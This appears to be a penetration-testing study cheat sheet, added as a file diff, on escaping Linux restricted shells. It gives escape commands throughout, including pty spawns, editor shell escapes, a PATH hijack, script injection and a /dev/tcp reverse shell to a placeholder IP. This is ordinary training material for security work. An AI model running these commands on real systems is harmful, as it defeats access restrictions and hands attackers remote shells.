@@ -1,0 +1,138 @@
+🛡️ Restricted Shells - Summary
+
+https://vk9-sec.com/linux-restricted-shell-bypass/ 
+
+Restricted Shells (rbash, rksh, rzsh) are designed to lock users down and prevent them from:
+
+Running certain binaries
+
+Changing directories (cd)
+
+Running scripts or programs outside allowed directories
+
+Modifying environment variables (PATH, SHELL, etc.)
+
+Creating aliases or functions (sometimes)
+
+They're often used in:
+
+Jump boxes
+
+DevOps CI/CD chains
+
+Shared hosting
+
+Bastion access with limited permissions
+
+🔍 Common Restricted Shells
+Shell Type	Name	Limitation Highlights
+rbash	Restricted Bourne Shell	No cd, no path changes, no redirections
+rksh	Restricted Korn Shell	No editing functions, no exec in arbitrary dirs
+rzsh	Restricted Z Shell	Most flexible, but still blocks functions/scripts/env edits
+🔓 Escape Techniques - CPTS “If This, Then That” Flow
+Got This	Try This
+Can't type bash or sh	Try: echo $0, which bash, see if bash still runs
+Limited to ls, echo, etc.	Try command substitution: ls -l `whoami`
+Can't run arbitrary binaries	Try: python -c 'import os; os.system("/bin/sh")' or awk
+Shell blocks cd, but allows env	Set custom $PATH, drop own binaries/scripts
+Can't escape path	Use full paths: /bin/sh, /usr/bin/python3
+Only vi, less, or man allowed	Use :!/bin/sh (Vi), !bash (less/man)
+Shell is rbash and home is writable	cp /bin/bash ./bash && chmod +x bash && ./bash --noprofile --norc
+🧨 Escape Technique Examples
+🔹 1. Command Injection via Allowed Binary
+bash
+Copy
+Edit
+ls -l `id`      # Outputs result of 'id'
+ls -l $(whoami) # Another way to sneak in
+🔹 2. Command Substitution
+bash
+Copy
+Edit
+echo `whoami`
+# Or try: echo $(uname -a)
+🔹 3. Command Chaining
+bash
+Copy
+Edit
+ls; whoami
+# You might chain into /bin/sh like:
+ls; /bin/sh
+🔹 4. Escape with a Shell
+bash
+Copy
+Edit
+/bin/sh
+/bin/bash
+bash -i
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+perl -e 'exec "/bin/sh";'
+🔹 5. Using Built-ins to Escape (GTFObins style)
+If vi, less, or man is allowed:
+
+bash
+Copy
+Edit
+vi        # Press ESC, then type: `:!/bin/bash`
+less file # Press `!bash`
+man bash  # Press `!sh`
+🔹 6. PATH Hijack + Fake Binary
+bash
+Copy
+Edit
+mkdir /tmp/fakebin
+echo -e '#!/bin/bash\n/bin/bash' > /tmp/fakebin/ls
+chmod +x /tmp/fakebin/ls
+PATH=/tmp/fakebin:$PATH
+export PATH
+ls       # Now runs your fake binary
+🔹 7. Custom Shell Function
+bash
+Copy
+Edit
+mysh() { /bin/sh; }
+mysh
+If functions are allowed, this is an easy breakout.
+
+🧠 CPTS Tips & Hidden Patterns
+Check the shell you're in:
+
+bash
+Copy
+Edit
+echo $0
+echo $SHELL
+Escape via allowed tools:
+
+awk, python, perl, expect, vi, scp, etc.
+
+If scp is allowed:
+
+bash
+Copy
+Edit
+scp -S bash x x:/dev/null
+Reverse Shell out: If outbound traffic is allowed, try:
+
+bash
+Copy
+Edit
+bash -i >& /dev/tcp/YOURIP/4444 0>&1
+Script Injection: If a startup script like .bashrc, .profile, or .bash_profile is writable — inject a shell call.
+
+🛠️ Enumeration Checklist (Manual)
+Check for writable $PATH, $SHELL, $HOME
+
+Look for alias, function, set restrictions
+
+Try known escape commands (above)
+
+Check which binaries are allowed (compgen -c, which, or tab-complete)
+
+Try symlink trick:
+
+bash
+Copy
+Edit
+ln -s /bin/bash shell
+./shell
